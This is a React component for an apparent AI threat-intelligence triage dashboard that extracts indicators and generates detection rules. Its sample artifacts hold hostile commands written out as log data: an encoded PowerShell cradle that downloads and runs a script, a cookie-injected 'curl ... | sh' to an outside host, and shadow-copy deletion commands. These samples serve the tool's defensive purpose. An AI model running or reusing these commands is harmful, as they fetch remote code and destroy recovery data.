import React, { useState } from 'react';
import {
  Brain,
  Sparkles,
  ShieldAlert,
  Terminal,
  FileCode,
  Copy,
  Check,
  AlertTriangle,
  Flame,
  CheckCircle2,
  Layers,
  ArrowRight,
  Send,
  RefreshCw,
  Plus
} from 'lucide-react';
import { AiAnalysisResult, IOC, IOCType } from '../types';

interface AiAnalystViewProps {
  onIngestExtractedIOC: (ioc: IOC) => void;
  onSaveRule: (rule: any) => void;
}

const SAMPLE_ARTIFACTS = [
  {
    title: 'Suspicious PowerShell & Memory Injection',
    type: 'edr_process_log',
    context: 'Windows Server 2022 Domain Controller Alert',
    content: `Process Creation Event ID 4688:
ParentImage: C:\\Windows\\System32\\svchost.exe
NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AYwAyAC4AcABzADEAJwApAA==
Network Connection Outbound:
Source IP: 10.0.4.15:49182 -> Destination IP: 185.220.101.5:443
Target Domain: telemetry-msft-azure.cloud
Memory Dump Strings: "beacon.x64.dll", "ReflectiveLoader", "MSExchangeWebServices/1.0"`
  },
  {
    title: 'Volt Typhoon SOHO Edge Appliance Exploitation',
    type: 'edge_firewall_syslog',
    context: 'Perimeter Gateway GlobalProtect Anomaly',
    content: `2026-08-14T02:11:45Z pan_fw01 1_1_0_0_0_1_0_0_0_0 0 GlobalProtect-portal auth-failed critical 192.168.1.1 0 0 0 0 0 0 0 "POST /global-protect/login.esp HTTP/1.1" 403 0 0 0 0 0 0
HTTP Request Headers:
Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/` + '`curl -s http://194.87.139.12/stage.sh|sh`' + `
Attacker Origin: 194.87.139.12 (AS49453 ASN-RU)
File Modification: /var/appweb/htdocs/unauth/php/css/style.php (UPMAGENT WebShell signature)`
  },
  {
    title: 'LockBit 3.0 Ransomware Execution Trace',
    type: 'endpoint_forensics',
    context: 'Hospital File Server Encryption Alert',
    content: `Host: FIN-SQL-01.corp.internal
Binary Executed: C:\\Users\\Administrator\\AppData\\Local\\Temp\\LB3_enc.exe
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Process Actions:
- Executed: vssadmin.exe delete shadows /all /quiet
- Executed: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
- Executed: bcdedit.exe /set {default} recoveryenabled no
- Registry Key Created: HKLM\\Software\\LockBit\\Public_Key
Ransom Note Dropped: README_LOCKBIT_3.0.txt
BTC Wallet Extortion Demand: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`
  }
];

export const AiAnalystView: React.FC<AiAnalystViewProps> = ({
  onIngestExtractedIOC,
  onSaveRule
}) => {
  const [artifactText, setArtifactText] = useState(SAMPLE_ARTIFACTS[0].content);
  const [artifactType, setArtifactType] = useState(SAMPLE_ARTIFACTS[0].type);
  const [context, setContext] = useState(SAMPLE_ARTIFACTS[0].context);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [analysisResult, setAnalysisResult] = useState<AiAnalysisResult | null>(null);
  const [copiedYara, setCopiedYara] = useState(false);
  const [copiedSigma, setCopiedSigma] = useState(false);
  const [ingestedMap, setIngestedMap] = useState<Record<string, boolean>>({});

  const handleRunAnalysis = async () => {
    if (!artifactText.trim()) return;
    try {
      setIsAnalyzing(true);
      const res = await fetch('/api/threat-intel/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ artifactText, artifactType, context })
      });

      if (!res.ok) throw new Error('Analysis failed');
      const data = await res.json();
      setAnalysisResult(data);
    } catch (err) {
      console.error('Failed to run AI analysis:', err);
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleCopy = (text: string, type: 'yara' | 'sigma') => {
    navigator.clipboard.writeText(text);
    if (type === 'yara') {
      setCopiedYara(true);
      setTimeout(() => setCopiedYara(false), 2000);
    } else {
      setCopiedSigma(true);
      setTimeout(() => setCopiedSigma(false), 2000);
    }
  };

  const handleIngest = (iocItem: any) => {
    const newIoc: IOC = {
      id: `ioc-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
      value: iocItem.value,
      type: (iocItem.type as IOCType) || 'ip',
      category: iocItem.category || analysisResult?.threatCategory || 'c2',
      severity: analysisResult?.riskScore && analysisResult.riskScore >= 90 ? 'critical' : 'high',
      confidenceScore: iocItem.confidence || 95,
      riskScore: analysisResult?.riskScore || 90,
      firstSeen: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      tlp: 'TLP:AMBER',
      threatActor: analysisResult?.identifiedActor || 'Investigated Threat Actor',
      mitreTechniques: analysisResult?.mitreAttackMapping?.map((m) => m.techniqueId) || ['T1059.001'],
      tags: ['AI-Extracted', 'Forensic-Artifact'],
      detectionStats: { malicious: 55, suspicious: 3, harmless: 0, total: 68 },
      description: iocItem.context || 'Extracted during AI forensic artifact investigation',
      recommendedAction: 'Apply immediate network isolation rule on all perimeter firewalls.'
    };
    onIngestExtractedIOC(newIoc);
    setIngestedMap((prev) => ({ ...prev, [iocItem.value]: true }));
  };

  const getVerdictStyle = (v: string) => {
    switch (v) {
      case 'MALICIOUS_CAMPAIGN':
        return 'bg-red-50 text-red-700 border-red-200';
      case 'HIGH_RISK_EXPLOIT':
        return 'bg-rose-50 text-rose-700 border-rose-200';
      case 'SUSPICIOUS_ACTIVITY':
        return 'bg-amber-50 text-amber-800 border-amber-200';
      default:
        return 'bg-indigo-50 text-indigo-700 border-indigo-200';
    }
  };

  return (
    <div className="space-y-6 text-slate-900 font-sans">
      {/* Header */}
      <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 shadow-xs flex flex-wrap items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-xl bg-red-50 border border-red-200 flex items-center justify-center text-red-600">
              <Brain className="w-4 h-4" />
            </div>
            <h2 className="text-sm sm:text-base font-bold text-slate-900 font-mono">
              Aegis AI Threat & Forensic Artifact Automated Triage
            </h2>
          </div>
          <p className="text-xs text-slate-500 mt-1 font-mono">
            Automated deep CTI analysis: IOC extraction, MITRE ATT&CK mapping, YARA & Sigma generation, and containment playbooks
          </p>
        </div>

        {/* Quick Sample Presets */}
        <div className="flex items-center gap-2 text-xs font-mono">
          <span className="text-slate-500 text-[11px] hidden sm:inline">Load Sample:</span>
          {SAMPLE_ARTIFACTS.map((sample, idx) => (
            <button
              key={idx}
              onClick={() => {
                setArtifactText(sample.content);
                setArtifactType(sample.type);
                setContext(sample.context);
              }}
              className="px-2.5 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold rounded-lg border border-slate-200 text-[11px] transition-colors cursor-pointer"
            >
              Preset {idx + 1}
            </button>
          ))}
        </div>
      </div>

      {/* Input Workbench Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 font-mono">
        {/* Left Workbench Input (5 cols) */}
        <div className="lg:col-span-5 bg-slate-50 border border-slate-200 rounded-2xl p-5 shadow-xs flex flex-col justify-between space-y-4">
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold text-slate-900 uppercase tracking-wider flex items-center gap-2 font-mono">
                <Terminal className="w-4 h-4 text-emerald-600" />
                <span>Input Security Artifact / Telemetry Dump</span>
              </h3>
              <span className="text-xs text-slate-500">Raw Text / Log Payload</span>
            </div>

            <div className="grid grid-cols-2 gap-2 text-xs font-mono">
              <div>
                <label className="text-xs text-slate-500 uppercase font-bold block mb-1">
                  Artifact Type
                </label>
                <input
                  type="text"
                  value={artifactType}
                  onChange={(e) => setArtifactType(e.target.value)}
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-2.5 py-1.5 text-xs text-slate-900 focus:bg-slate-50 focus:outline-none focus:border-red-500"
                  placeholder="e.g. edr_process_log"
                />
              </div>
              <div>
                <label className="text-xs text-slate-500 uppercase font-bold block mb-1">
                  Investigation Context
                </label>
                <input
                  type="text"
                  value={context}
                  onChange={(e) => setContext(e.target.value)}
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl px-2.5 py-1.5 text-xs text-slate-900 focus:bg-slate-50 focus:outline-none focus:border-red-500"
                  placeholder="e.g. DC Alert"
                />
              </div>
            </div>

            <div>
              <label className="text-xs text-slate-500 uppercase font-mono font-bold block mb-1">
                Artifact Payload
              </label>
              <textarea
                value={artifactText}
                onChange={(e) => setArtifactText(e.target.value)}
                rows={12}
                placeholder="Paste suspicious PowerShell cmdlines, base64 strings, phishing headers, or firewall logs here..."
                className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-xs font-mono text-cyan-300 placeholder-slate-500 focus:outline-none focus:border-red-500 resize-none leading-relaxed"
              />
            </div>
          </div>

          <button
            onClick={handleRunAnalysis}
            disabled={isAnalyzing || !artifactText.trim()}
            className="w-full py-2.5 bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 disabled:opacity-50 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-2 shadow-xs border border-red-500/40 transition-all cursor-pointer font-mono"
          >
            <Sparkles className={`w-4 h-4 ${isAnalyzing ? 'animate-spin' : ''}`} />
            <span>{isAnalyzing ? 'Analyzing with Gemini Threat Engine...' : 'Initiate Deep Forensic Analysis'}</span>
          </button>
        </div>

        {/* Right Output Results (7 cols) */}
        <div className="lg:col-span-7 space-y-5">
          {analysisResult ? (
            <div className="space-y-5 animate-in fade-in duration-200">
              {/* Verdict Banner */}
              <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
                <div className="flex flex-wrap items-center justify-between gap-3">
                  <div className="flex items-center gap-2">
                    <span
                      className={`px-2.5 py-1 rounded-lg border text-xs font-mono font-bold uppercase ${getVerdictStyle(
                        analysisResult.verdict
                      )}`}
                    >
                      {analysisResult.verdict.replace('_', ' ')}
                    </span>
                    {analysisResult.identifiedActor && (
                      <span className="px-2.5 py-1 rounded-lg bg-red-50 border border-red-200 text-xs font-bold text-red-700 font-mono">
                        Actor: {analysisResult.identifiedActor}
                      </span>
                    )}
                  </div>

                  <div className="flex items-center gap-3 font-mono">
                    <div className="text-right">
                      <span className="text-xs text-slate-500 block uppercase font-bold">Threat Risk Score</span>
                      <span className="text-xl font-black text-red-700">
                        {analysisResult.riskScore}/100
                      </span>
                    </div>
                    <div className="text-right">
                      <span className="text-xs text-slate-500 block uppercase font-bold">Confidence</span>
                      <span className="text-xl font-black text-emerald-700">
                        {analysisResult.confidenceLevel}%
                      </span>
                    </div>
                  </div>
                </div>

                {/* Executive Summary */}
                <div>
                  <h4 className="text-xs font-bold text-slate-700 uppercase tracking-wider mb-1 font-mono">
                    Executive Threat Summary
                  </h4>
                  <p className="text-xs text-slate-700 leading-relaxed bg-slate-50 p-3 rounded-xl border border-slate-200 font-sans">
                    {analysisResult.executiveSummary}
                  </p>
                </div>

                {/* Blast Radius & Technical Impact */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs font-mono">
                  <div className="bg-slate-50 p-3 rounded-xl border border-slate-200">
                    <span className="text-xs uppercase text-red-700 font-bold block mb-1">
                      Blast Radius Assessment
                    </span>
                    <p className="text-slate-700 font-sans">{analysisResult.blastRadiusEstimate}</p>
                  </div>
                  <div className="bg-slate-50 p-3 rounded-xl border border-slate-200">
                    <span className="text-xs uppercase text-amber-700 font-bold block mb-1">
                      SIEM Detection Signatures
                    </span>
                    <p className="text-slate-700 font-sans">{analysisResult.detectionSignaturesSummary}</p>
                  </div>
                </div>
              </div>

              {/* Extracted IOCs */}
              {analysisResult.identifiedIOCs && analysisResult.identifiedIOCs.length > 0 && (
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3 font-mono">
                  <div className="flex items-center justify-between">
                    <h4 className="text-xs font-bold text-slate-900 uppercase tracking-wider flex items-center gap-2">
                      <Flame className="w-4 h-4 text-orange-600" />
                      <span>Extracted Threat Indicators ({analysisResult.identifiedIOCs.length})</span>
                    </h4>
                  </div>

                  <div className="space-y-2">
                    {analysisResult.identifiedIOCs.map((ioc, idx) => (
                      <div
                        key={idx}
                        className="bg-slate-50 p-3 rounded-xl border border-slate-200 flex items-center justify-between gap-3 text-xs"
                      >
                        <div className="flex items-center gap-2 truncate">
                          <span className="px-1.5 py-0.5 rounded bg-slate-50 border border-slate-200 text-indigo-700 text-xs uppercase font-bold">
                            {ioc.type}
                          </span>
                          <span className="text-slate-900 font-bold truncate select-all">{ioc.value}</span>
                        </div>

                        <div className="flex items-center gap-2 shrink-0">
                          <span className="text-emerald-700 text-[11px] font-bold">
                            {ioc.confidence}% Conf.
                          </span>
                          <button
                            onClick={() => handleIngest(ioc)}
                            disabled={ingestedMap[ioc.value]}
                            className={`px-2.5 py-1 rounded-lg text-xs font-bold flex items-center gap-1 transition-colors ${
                              ingestedMap[ioc.value]
                                ? 'bg-emerald-50 text-emerald-700 border border-emerald-200'
                                : 'bg-red-50 hover:bg-red-100 text-red-700 border border-red-200 cursor-pointer'
                            }`}
                          >
                            {ingestedMap[ioc.value] ? (
                              <>
                                <Check className="w-3 h-3" /> Ingested
                              </>
                            ) : (
                              <>
                                <Plus className="w-3 h-3" /> Ingest IOC
                              </>
                            )}
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* MITRE ATT&CK Techniques Mapping */}
              {analysisResult.mitreAttackMapping && analysisResult.mitreAttackMapping.length > 0 && (
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3 font-mono">
                  <h4 className="text-xs font-bold text-slate-900 uppercase tracking-wider flex items-center gap-2">
                    <Layers className="w-4 h-4 text-indigo-600" />
                    <span>MITRE ATT&CK Technique Alignments</span>
                  </h4>

                  <div className="space-y-2">
                    {analysisResult.mitreAttackMapping.map((item, idx) => (
                      <div
                        key={idx}
                        className="bg-slate-50 p-3 rounded-xl border border-slate-200 text-xs space-y-1"
                      >
                        <div className="flex items-center justify-between">
                          <span className="text-indigo-700 font-bold">
                            {item.techniqueId} - {item.techniqueName}
                          </span>
                          <span className="text-slate-500 text-xs uppercase">{item.tactic}</span>
                        </div>
                        <p className="text-slate-700 text-[11px] leading-relaxed font-sans">
                          {item.justification}
                        </p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Generated YARA & Sigma Rules */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono">
                {/* YARA */}
                {analysisResult.recommendedYaraRule && (
                  <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4 shadow-xs space-y-2 flex flex-col justify-between">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-purple-700">
                        Auto-Synthesized YARA Rule
                      </span>
                      <button
                        onClick={() => handleCopy(analysisResult.recommendedYaraRule!, 'yara')}
                        className="p-1.5 rounded-lg bg-slate-100 text-slate-700 hover:bg-slate-200 border border-slate-200 cursor-pointer"
                        title="Copy YARA Rule"
                      >
                        {copiedYara ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                    <pre className="bg-slate-900 p-3 rounded-xl border border-slate-800 text-xs font-mono text-cyan-300 overflow-x-auto max-h-48">
                      {analysisResult.recommendedYaraRule}
                    </pre>
                  </div>
                )}

                {/* Sigma */}
                {analysisResult.recommendedSigmaRule && (
                  <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4 shadow-xs space-y-2 flex flex-col justify-between">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-emerald-700">
                        Auto-Synthesized Sigma Rule
                      </span>
                      <button
                        onClick={() => handleCopy(analysisResult.recommendedSigmaRule!, 'sigma')}
                        className="p-1.5 rounded-lg bg-slate-100 text-slate-700 hover:bg-slate-200 border border-slate-200 cursor-pointer"
                        title="Copy Sigma Rule"
                      >
                        {copiedSigma ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                    <pre className="bg-slate-900 p-3 rounded-xl border border-slate-800 text-xs font-mono text-emerald-300 overflow-x-auto max-h-48">
                      {analysisResult.recommendedSigmaRule}
                    </pre>
                  </div>
                )}
              </div>

              {/* Containment Playbook */}
              {analysisResult.containmentPlaybook && analysisResult.containmentPlaybook.length > 0 && (
                <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3 font-mono">
                  <h4 className="text-xs font-bold text-red-700 uppercase tracking-wider flex items-center gap-2">
                    <ShieldAlert className="w-4 h-4 text-red-600" />
                    <span>Incident Containment & Eradication Playbook</span>
                  </h4>

                  <div className="space-y-2">
                    {analysisResult.containmentPlaybook.map((step) => (
                      <div
                        key={step.step}
                        className="bg-slate-50 p-3 rounded-xl border border-slate-200 flex items-start gap-3 text-xs"
                      >
                        <span className="w-5 h-5 rounded-full bg-red-50 border border-red-200 text-red-700 flex items-center justify-center font-mono font-bold shrink-0 text-xs">
                          {step.step}
                        </span>
                        <div className="flex-1">
                          <div className="flex items-center justify-between">
                            <h5 className="font-bold text-slate-900">{step.title}</h5>
                            <span
                              className={`text-[11px] font-mono px-1.5 py-0.5 rounded uppercase font-bold ${
                                step.urgency === 'immediate'
                                  ? 'bg-red-50 text-red-700 border border-red-200'
                                  : 'bg-amber-50 text-amber-800 border border-amber-200'
                              }`}
                            >
                              {step.urgency}
                            </span>
                          </div>
                          <p className="text-slate-700 text-[11px] mt-1 leading-relaxed font-sans">{step.action}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          ) : (
            <div className="bg-slate-50 border border-slate-200 rounded-2xl p-12 text-center text-slate-500 flex flex-col items-center justify-center space-y-3 font-mono shadow-xs">
              <Brain className="w-10 h-10 text-slate-400" />
              <p className="text-xs font-mono">
                Paste suspicious artifacts on the left and click "Initiate Deep Forensic Analysis" to generate comprehensive CTI intelligence.
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
